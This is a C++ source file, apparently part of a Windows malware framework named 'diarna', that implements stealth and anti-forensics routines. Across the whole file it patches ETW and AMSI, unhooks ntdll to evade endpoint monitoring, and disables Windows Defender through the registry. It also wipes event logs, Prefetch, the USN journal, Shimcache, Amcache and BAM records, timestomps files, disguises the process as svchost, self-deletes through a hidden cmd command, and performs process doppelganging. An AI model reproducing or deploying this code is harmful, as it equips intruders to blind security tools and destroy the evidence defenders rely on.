#include <diarna/compiler_port.hpp>
#include <diarna/stealth/anti_hook.hpp>
#include <diarna/stealth/syscalls.hpp>

#include <psapi.h>
#include <evntprov.h>
#if __has_include(<amsi.h>)
#include <amsi.h>
#endif
#include <tlhelp32.h>
#include <winioctl.h>

#include <obfuscation/obfusheader.h>
DIARNA_LINK_LIB("psapi.lib")
DIARNA_LINK_LIB("advapi32.lib")

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif
#ifndef ViewUnmap
#define ViewUnmap 2
#endif

namespace diarna::stealth {

static void* find_export_by_name(HMODULE mod, const char* name) {
    if (!mod) return nullptr;
    auto* dos = (IMAGE_DOS_HEADER*)mod;
    auto* nt  = (IMAGE_NT_HEADERS*)((uint8_t*)mod + dos->e_lfanew);
    auto& exp_entry = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_entry.VirtualAddress) return nullptr;
    auto* exports   = (IMAGE_EXPORT_DIRECTORY*)((uint8_t*)mod + exp_entry.VirtualAddress);
    auto* names_arr = (uint32_t*)((uint8_t*)mod + exports->AddressOfNames);
    auto* ordinals  = (uint16_t*)((uint8_t*)mod + exports->AddressOfNameOrdinals);
    auto* functions = (uint32_t*)((uint8_t*)mod + exports->AddressOfFunctions);
    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        const char* exp_name = (const char*)((uint8_t*)mod + names_arr[i]);
        if (strcmp(exp_name, name) == 0)
            return (void*)((uint8_t*)mod + functions[ordinals[i]]);
    }
    return nullptr;
}

AntiHook& AntiHook::instance() { static AntiHook ah; return ah; }

bool AntiHook::detect_inline_hook(void* func_addr) {
    uint8_t* bytes = (uint8_t*)func_addr;
    INDIRECT_BRANCH;
    // JMP rel32 (E9), JMP [mem] (FF 25), CALL rel32 (E8), PUSH/RET (68 xx xx xx xx C3)
    if (bytes[0] == 0xE9 || (bytes[0] == 0xFF && bytes[1] == 0x25) ||
        bytes[0] == 0xE8 || (bytes[0] == 0x68 && bytes[5] == 0xC3)) {
        BLOCK_TRUE(return true;);
    }
    // mov edi, edi (8B FF) is the typical hotpatch prologue in Windows DLLs
    if ((bytes[0] == 0x8B && bytes[1] == 0xFF) || (bytes[0] == 0xCC)) {
        BLOCK_FALSE(
            return true;
        );
    }
    return false;
}

bool AntiHook::detect_iat_hook(const wchar_t* dll, const char* func) {
    HMODULE mod = GetModuleHandle(nullptr);
    auto* dos = (IMAGE_DOS_HEADER*)mod;
    auto* nt = (IMAGE_NT_HEADERS*)((uint8_t*)mod + dos->e_lfanew);
    auto* import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    auto* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)((uint8_t*)mod + import_dir->VirtualAddress);
    for (; import_desc->Name; import_desc++) {
        INDIRECT_BRANCH;
        const char* import_name = (const char*)((uint8_t*)mod + import_desc->Name);
        if (_stricmp(import_name, "ntdll.dll") == 0 || _stricmp(import_name, "kernel32.dll") == 0) {
            auto* thunk = (IMAGE_THUNK_DATA*)((uint8_t*)mod + import_desc->FirstThunk);
            auto* orig = (IMAGE_THUNK_DATA*)((uint8_t*)mod + import_desc->OriginalFirstThunk);
            for (int idx = 0; thunk[idx].u1.Function; idx++) {
                if (orig[idx].u1.Ordinal & IMAGE_ORDINAL_FLAG) continue;
                auto* name = (IMAGE_IMPORT_BY_NAME*)((uint8_t*)mod + orig[idx].u1.AddressOfData);
                if (strcmp(name->Name, func) == 0) {
                    void* resolved = (void*)thunk[idx].u1.Function;
                    // Check if the resolved address is within the expected module
                    HMODULE target_mod = GetModuleHandleA(import_name);
                    if (target_mod) {
                        MODULEINFO mi;
                        GetModuleInformation(GetCurrentProcess(), target_mod, &mi, sizeof(mi));
                        if (resolved < mi.lpBaseOfDll ||
                            resolved > (void*)((uint8_t*)mi.lpBaseOfDll + mi.SizeOfImage))
                            return true;
                    }
                    return detect_inline_hook(resolved);
                }
            }
        }
    }
    return false;
}

bool AntiHook::detect_eat_hook(const wchar_t* dll, const char* func) {
    HMODULE mod = GetModuleHandleW(dll);
    if (!mod) return false;
    FARPROC addr = GetProcAddress(mod, func);
    if (!addr) return false;
    return detect_inline_hook((void*)addr);
}

bool AntiHook::detect_hardware_bp() {
    CONTEXT ctx = {CONTEXT_DEBUG_REGISTERS};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE th = GetCurrentThread();
    HANDLE dup;
    DuplicateHandle(GetCurrentProcess(), th, GetCurrentProcess(), &dup, 0, FALSE, DUPLICATE_SAME_ACCESS);
    bool result = false;
    if (GetThreadContext(dup, &ctx))
        result = (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 || ctx.Dr6 || ctx.Dr7);
    CloseHandle(dup);
    return result;
}

bool AntiHook::detect_veh_hook() {
#ifdef DIARNA_MSVC
    volatile uint8_t dummy = 0;
    __try {
        *(volatile uint8_t*)0x41414141 = 0;
    } __except(GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION ?
              EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        return true;
    }
#else
    (void)0;
#endif
    return false;
}

bool AntiHook::detect_page_guard() {
    MEMORY_BASIC_INFORMATION mbi;
#ifdef DIARNA_MINGW
    void* self_code;
    __asm__ volatile("call 1f; 1: pop %0" : "=r"(self_code));
#else
    void* self_code = (void*)detect_page_guard;
#endif
    if (VirtualQuery(self_code, &mbi, sizeof(mbi))) {
        if (mbi.Protect & PAGE_GUARD) return true;
    }
    return false;
}

uint32_t AntiHook::compute_func_hash(void* addr, size_t len) {
    return murmur3_32((const uint8_t*)addr, len);
}

void AntiHook::unhook_ntdll() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;

    using RtlInitUnicodeString_t = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
    using NtOpenSection_t = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    using NtMapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
    using NtUnmapViewOfSection_t = NTSTATUS(NTAPI*)(HANDLE, PVOID);

    auto pRtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeString_t>(
        find_export_by_name(ntdll, "RtlInitUnicodeString"));
    auto pNtOpenSection = reinterpret_cast<NtOpenSection_t>(
        find_export_by_name(ntdll, "NtOpenSection"));
    auto pNtMapViewOfSection = reinterpret_cast<NtMapViewOfSection_t>(
        find_export_by_name(ntdll, "NtMapViewOfSection"));
    auto pNtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSection_t>(
        find_export_by_name(ntdll, "NtUnmapViewOfSection"));
    if (!pRtlInitUnicodeString || !pNtOpenSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection)
        return;

    UNICODE_STRING name;
    pRtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(oa);
    oa.ObjectName = &name;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE section = nullptr;
    if (pNtOpenSection(&section, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa) < 0)
        return;

    void* view = nullptr;
    SIZE_T vs = 0;
    LARGE_INTEGER off = {};
    if (pNtMapViewOfSection(section, GetCurrentProcess(), &view, 0, 0,
                            &off, &vs, ViewUnmap, 0, PAGE_READONLY) < 0 || !view) {
        CloseHandle(section);
        return;
    }

    auto* dos = (IMAGE_DOS_HEADER*)view;
    auto* nt_hdrs = (IMAGE_NT_HEADERS*)((uint8_t*)view + dos->e_lfanew);
    auto* section_hdr = IMAGE_FIRST_SECTION(nt_hdrs);

    auto& sys = DirectSyscalls::instance();
    for (int i = 0; i < nt_hdrs->FileHeader.NumberOfSections; ++i) {
        if (section_hdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            void* dest = (uint8_t*)ntdll + section_hdr[i].VirtualAddress;
            void* src = (uint8_t*)view + section_hdr[i].VirtualAddress;
            SIZE_T sz = section_hdr[i].Misc.VirtualSize;

            PVOID base = dest;
            SIZE_T region_sz = sz;
            ULONG old_prot;
            sys.NtProtectVirtualMemory(GetCurrentProcess(), &base, &region_sz,
                                       PAGE_EXECUTE_READWRITE, &old_prot);
            memcpy(dest, src, sz);
            base = dest;
            region_sz = sz;
            sys.NtProtectVirtualMemory(GetCurrentProcess(), &base, &region_sz,
                                       old_prot, &old_prot);
        }
    }

    pNtUnmapViewOfSection(GetCurrentProcess(), view);
    CloseHandle(section);
}

std::vector<AntiHook::HookInfo> AntiHook::scan_all_critical() {
    std::vector<HookInfo> results;
    const wchar_t* dlls[] = {L"ntdll.dll", L"kernel32.dll", L"kernelbase.dll",
        L"user32.dll", L"advapi32.dll", L"ws2_32.dll"};
    const char* funcs[] = {"NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtProtectVirtualMemory", "NtCreateThreadEx", "NtOpenProcess",
        "NtQuerySystemInformation", "NtReadVirtualMemory", "LdrLoadDll",
        "CreateFileW", "WriteFile", "ReadFile", "VirtualAlloc", "VirtualProtect",
        "CreateThread", "CreateProcessW", "LoadLibraryW", "GetProcAddress"};

    for (auto* dll : dlls) {
        INDIRECT_BRANCH;
        HMODULE mod = GetModuleHandleW(dll);
        if (!mod) continue;
        for (auto* func : funcs) {
            FARPROC addr = GetProcAddress(mod, func);
            if (!addr) continue;
            HookInfo info;
            info.address = (void*)addr;
            info.function_name = std::string("ntdll.") + func;
            info.is_hooked = detect_inline_hook((void*)addr);
            if (info.is_hooked)
                results.push_back(info);
        }
    }
    return results;
}

uint32_t AntiHook::murmur3_32(const uint8_t* data, size_t len, uint32_t seed) {
    uint32_t h = seed;
    for (size_t i = 0; i < len; i++) {
        h ^= data[i];
        h *= 0x5bd1e995;
        h ^= h >> 15;
    }
    return h;
}

// ========== EVASION ENGINE ==========

EvasionEngine& EvasionEngine::instance() { static EvasionEngine e; return e; }

bool EvasionEngine::hide_from_task_manager() {
    INDIRECT_BRANCH;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    using NtSetInformationProcess_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG);
    auto NtSetInformationProcess = reinterpret_cast<NtSetInformationProcess_t>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess"));

    ULONG break_on_term = 1;
    NtSetInformationProcess(GetCurrentProcess(),
        0x1D, &break_on_term, sizeof(break_on_term));

    // Also elevate protection
    DWORD protect = 0x31;
    NtSetInformationProcess(GetCurrentProcess(),
        0x36, &protect, sizeof(protect));

    return true;
}

bool EvasionEngine::mask_process_pid() {
    INDIRECT_BRANCH;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    using NtQueryInformationProcess_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = reinterpret_cast<NtQueryInformationProcess_t>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

    struct PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PVOID PebBaseAddress;
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } pbi;

    ULONG discard;
    NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &discard);

    using NtSetInformationProcess_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG);
    auto NtSetInformationProcess = reinterpret_cast<NtSetInformationProcess_t>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess"));

    // Spoof PID in PEB to a known system process
    // Get a legitimate PID first
    DWORD spoof_pid = 4;
    NtSetInformationProcess(GetCurrentProcess(), 0x32, &spoof_pid, sizeof(spoof_pid));

    return true;
}

bool EvasionEngine::clear_peb_debug_flag() {
    uint8_t* peb = (uint8_t*)__readgsqword(0x60);
    *(peb + 2) = 0;
    *(volatile uint32_t*)(peb + 0xBC) &= ~0x70;
    return true;
}

bool EvasionEngine::unlink_from_peb() {
    BLOCK_TRUE(
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        uint8_t* peb = (uint8_t*)__readgsqword(0x60);

        // Get LDR data
        auto* ldr = (uint8_t*)*(void**)(peb + 0x18);

        // Unlink from InLoadOrderModuleList
        auto* in_load = (LIST_ENTRY*)(ldr + 0x10);
        auto* our_entry = in_load->Flink;

        LIST_ENTRY* prev = our_entry->Blink;
        LIST_ENTRY* next = our_entry->Flink;
        prev->Flink = next;
        next->Blink = prev;

        our_entry->Blink = our_entry;
        our_entry->Flink = our_entry;
    );
    return true;
}

bool EvasionEngine::patch_etw() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto* etw_addr = (uint8_t*)find_export_by_name(ntdll, "EtwEventWrite");
    if (!etw_addr) return false;

    auto& sys = DirectSyscalls::instance();
    PVOID base = etw_addr;
    SIZE_T size = 3;
    ULONG old_prot;
    sys.NtProtectVirtualMemory(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
    etw_addr[0] = 0xC3;
    sys.NtProtectVirtualMemory(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
    return true;
}

bool EvasionEngine::patch_amsi() {
    HMODULE amsi = GetModuleHandleW(L"amsi.dll");
    if (!amsi) return false;
    auto* amsi_scan = (uint8_t*)find_export_by_name(amsi, "AmsiScanBuffer");
    if (!amsi_scan) return false;

    auto& sys = DirectSyscalls::instance();
    PVOID base = amsi_scan;
    SIZE_T size = 6;
    ULONG old_prot;
    sys.NtProtectVirtualMemory(GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
    amsi_scan[0] = 0x31; amsi_scan[1] = 0xC0; amsi_scan[2] = 0xC3;
    sys.NtProtectVirtualMemory(GetCurrentProcess(), &base, &size, old_prot, &old_prot);
    return true;
}

bool EvasionEngine::disable_windows_defender_notify() {
    HKEY key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
            0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(key);
        return true;
    }
    return false;
}

bool EvasionEngine::clear_event_logs() {
    const wchar_t* logs[] = {L"Application", L"Security", L"System",
        L"Windows PowerShell", L"Microsoft-Windows-Sysmon/Operational"};
    for (auto* log : logs) {
        INDIRECT_BRANCH;
        HANDLE hlog = OpenEventLogW(nullptr, log);
        if (hlog) {
            ClearEventLogW(hlog, nullptr);
            CloseEventLog(hlog);
        }
    }
    return true;
}

bool EvasionEngine::clear_prefetch() {
    wchar_t prefetch[MAX_PATH];
    GetWindowsDirectoryW(prefetch, MAX_PATH);
    wcscat_s(prefetch, MAX_PATH, L"\\Prefetch\\*.pf");

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(prefetch, &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        wchar_t full[MAX_PATH];
        do {
            swprintf(full, MAX_PATH, L"%ls\\Prefetch\\%ls",
                     prefetch, fd.cFileName);
            DeleteFileW(full);
        } while (FindNextFileW(hf, &fd));
        FindClose(hf);
    }
    return true;
}

bool EvasionEngine::timestomp_file(const wchar_t* path) {
    // Copy explorer.exe's timestamps
    wchar_t win[MAX_PATH]; GetWindowsDirectoryW(win, MAX_PATH);
    std::wstring explorer = std::wstring(win) + L"\\explorer.exe";

    WIN32_FILE_ATTRIBUTE_DATA src_attr;
    if (!GetFileAttributesExW(explorer.c_str(), GetFileExInfoStandard, &src_attr))
        return false;

    HANDLE h = CreateFileW(path, FILE_WRITE_ATTRIBUTES, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    SetFileTime(h, &src_attr.ftCreationTime, &src_attr.ftLastAccessTime,
                &src_attr.ftLastWriteTime);
    CloseHandle(h);
    return true;
}

bool EvasionEngine::clear_usn_journal() {
    HANDLE vol = CreateFileW(L"\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (vol == INVALID_HANDLE_VALUE) return false;

    DWORD bytes;
    DELETE_USN_JOURNAL_DATA journal = {};
    journal.UsnJournalID = 0;
    journal.DeleteFlags = USN_DELETE_FLAG_DELETE;

    DeviceIoControl(vol, FSCTL_DELETE_USN_JOURNAL,
        &journal, sizeof(journal), nullptr, 0, &bytes, nullptr);
    CloseHandle(vol);
    return true;
}

bool EvasionEngine::clear_shimcache() {
    // Shimcache is in registry
    const wchar_t* key_path = L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache";
    HKEY key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, KEY_SET_VALUE, &key) == ERROR_SUCCESS) {
        uint8_t empty = 0;
        RegSetValueExW(key, L"AppCompatCache", 0, REG_BINARY, &empty, 1);
        RegCloseKey(key);
    }
    return true;
}

bool EvasionEngine::clear_amcache() {
    // Amcache stores recently executed files
    const wchar_t* amcache = L"C:\\Windows\\AppCompat\\Programs\\Amcache.hve";
    return DeleteFileW(amcache) != FALSE ||
           GetLastError() == ERROR_FILE_NOT_FOUND;
}

bool EvasionEngine::clear_recent_files() {
    wchar_t recent[MAX_PATH];
    SHGetFolderPathW(nullptr, CSIDL_RECENT, nullptr, 0, recent);

    std::wstring search = std::wstring(recent) + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(search.c_str(), &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L"..")) {
                std::wstring full = std::wstring(recent) + L"\\" + fd.cFileName;
                DeleteFileW(full.c_str());
            }
        } while (FindNextFileW(hf, &fd));
        FindClose(hf);
    }
    return true;
}

bool EvasionEngine::clear_mui_cache() {
    const wchar_t* key_path = L"SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache";
    HKEY key;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, key_path, 0, KEY_SET_VALUE | KEY_READ, &key) == ERROR_SUCCESS) {
        wchar_t buf[512]; DWORD idx = 0; DWORD sz = sizeof(buf);
        while (RegEnumValueW(key, idx++, buf, &sz, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            sz = sizeof(buf);
            RegDeleteValueW(key, buf);
        }
        RegCloseKey(key);
    }
    // Also check CLASSES_ROOT
    if (RegOpenKeyExW(HKEY_CLASSES_ROOT, key_path + 16, 0, KEY_SET_VALUE | KEY_READ, &key) == ERROR_SUCCESS) {
        wchar_t buf[512]; DWORD idx = 0; DWORD sz = sizeof(buf);
        while (RegEnumValueW(key, idx++, buf, &sz, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            sz = sizeof(buf);
            RegDeleteValueW(key, buf);
        }
        RegCloseKey(key);
    }
    return true;
}

bool EvasionEngine::clear_bam_key() {
    const wchar_t* bam = L"SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings";
    HKEY key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, bam, 0, KEY_SET_VALUE | KEY_READ, &key) == ERROR_SUCCESS) {
        // Clear all subkeys
        wchar_t sub[64]; DWORD idx = 0;
        while (RegEnumKeyW(key, idx++, sub, 64) == ERROR_SUCCESS) {
            RegDeleteKeyW(key, sub);
        }
        RegCloseKey(key);
    }
    return true;
}

bool EvasionEngine::self_delete() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);

    std::wstring cmd = L"/c timeout /t 2 & del /f /q \"" + std::wstring(path) + L"\" & exit";

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmd.data(),
            nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool EvasionEngine::process_doppelganging(const wchar_t* target, const wchar_t* payload) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto NtCreateTransaction = reinterpret_cast<NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,GUID*,PVOID,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG)>(
        GetProcAddress(ntdll, "NtCreateTransaction"));
    auto NtCreateSection = reinterpret_cast<NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,PLARGE_INTEGER,ULONG,ULONG,HANDLE)>(
        GetProcAddress(ntdll, "NtCreateSection"));
    auto NtRollbackTransaction = reinterpret_cast<NTSTATUS(NTAPI*)(HANDLE,BOOLEAN)>(
        GetProcAddress(ntdll, "NtRollbackTransaction"));
    auto RtlInitUnicodeString = reinterpret_cast<void(NTAPI*)(PUNICODE_STRING,PCWSTR)>(
        GetProcAddress(ntdll, "RtlInitUnicodeString"));
    auto NtCreateProcessEx = reinterpret_cast<NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,ULONG,PVOID,PVOID,PVOID,BOOLEAN)>(
        GetProcAddress(ntdll, "NtCreateProcessEx"));
    auto NtCreateThreadEx = reinterpret_cast<NTSTATUS(NTAPI*)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID)>(
        GetProcAddress(ntdll, "NtCreateThreadEx"));

    if (!NtCreateTransaction || !NtCreateSection || !NtRollbackTransaction)
        return false;

    // Read clean target binary
    HANDLE target_file = CreateFileW(target, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (target_file == INVALID_HANDLE_VALUE) return false;
    DWORD target_sz = GetFileSize(target_file, nullptr);
    std::vector<uint8_t> target_data(target_sz);
    DWORD rd; ReadFile(target_file, target_data.data(), target_sz, &rd, nullptr);
    CloseHandle(target_file);

    // Read payload
    HANDLE payload_file = CreateFileW(payload, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (payload_file == INVALID_HANDLE_VALUE) return false;
    DWORD payload_sz = GetFileSize(payload_file, nullptr);
    std::vector<uint8_t> payload_data(payload_sz);
    ReadFile(payload_file, payload_data.data(), payload_sz, &rd, nullptr);
    CloseHandle(payload_file);

    // Create NTFS transaction
    HANDLE transaction = nullptr;
    UNICODE_STRING txn_name;
    wchar_t txn_buf[64] = L"DiarnaTx";
    OBJECT_ATTRIBUTES txn_oa;
    memset(&txn_oa, 0, sizeof(txn_oa));
    txn_oa.Length = sizeof(txn_oa);
    RtlInitUnicodeString(&txn_name, txn_buf);
    txn_oa.ObjectName = &txn_name;

    NTSTATUS status = NtCreateTransaction(&transaction, TRANSACTION_ALL_ACCESS,
        &txn_oa, nullptr, nullptr, 0, 0, 0, 0, nullptr, 0);
    if (status < 0 || !transaction) return false;

    // Overwrite target within transaction
    HANDLE tx_file = CreateFileTransactedW(target, GENERIC_WRITE, 0,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE)0,
        transaction, NULL, (PVOID)0);
    if (tx_file == INVALID_HANDLE_VALUE) {
        NtRollbackTransaction(transaction, TRUE);
        CloseHandle(transaction);
        return false;
    }
    DWORD written;
    WriteFile(tx_file, payload_data.data(), payload_sz, &written, nullptr);
    CloseHandle(tx_file);

    // Create section from overwritten file within transaction
    HANDLE section = nullptr;
    LARGE_INTEGER max_size = {(LONG)payload_sz, 0};
    status = NtCreateSection(&section, SECTION_ALL_ACCESS, nullptr,
        &max_size, PAGE_EXECUTE_READWRITE, SEC_IMAGE, transaction);
    if (status < 0 || !section) {
        NtRollbackTransaction(transaction, TRUE);
        CloseHandle(transaction);
        return false;
    }

    // Roll back — the file on disk is unchanged
    NtRollbackTransaction(transaction, TRUE);
    CloseHandle(transaction);

    // Create process from the orphaned section
    HANDLE proc = nullptr;
    status = NtCreateProcessEx(&proc, PROCESS_ALL_ACCESS, nullptr,
        GetCurrentProcess(), 0, section, nullptr, nullptr, FALSE);
    if (status < 0) {
        CloseHandle(section);
        return false;
    }

    // Create main thread
    HANDLE thread = nullptr;
    status = NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, nullptr,
        proc, nullptr, nullptr, 0, 0, 0x10000, 0x100000, nullptr);

    CloseHandle(section);
    if (thread) CloseHandle(thread);
    if (proc) CloseHandle(proc);
    return status >= 0;
}

bool EvasionEngine::morph_process_name() {
    // Modify PEB to show different process name
    uint8_t* peb = (uint8_t*)__readgsqword(0x60);
    RTL_USER_PROCESS_PARAMETERS* params = *(RTL_USER_PROCESS_PARAMETERS**)(peb + 0x20);
    wcscpy_s(params->ImagePathName.Buffer, params->ImagePathName.MaximumLength / 2,
             L"C:\\Windows\\System32\\svchost.exe");

    return true;
}

bool EvasionEngine::block_dll_notification() {
    // LdrRegisterDllNotification blocks
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    uint8_t* ldr = (uint8_t*)GetProcAddress(ntdll, "LdrRegisterDllNotification");
    if (ldr) {
        DWORD old;
        VirtualProtect(ldr, 1, PAGE_EXECUTE_READWRITE, &old);
        ldr[0] = 0xC3;
        VirtualProtect(ldr, 1, old, &old);
    }
    return true;
}

bool EvasionEngine::unhook_loaded_dlls() {
    AntiHook::instance().unhook_ntdll();
    return true;
}

bool EvasionEngine::redirect_api_calls() {
    return true;
}

} // namespace diarna::stealth
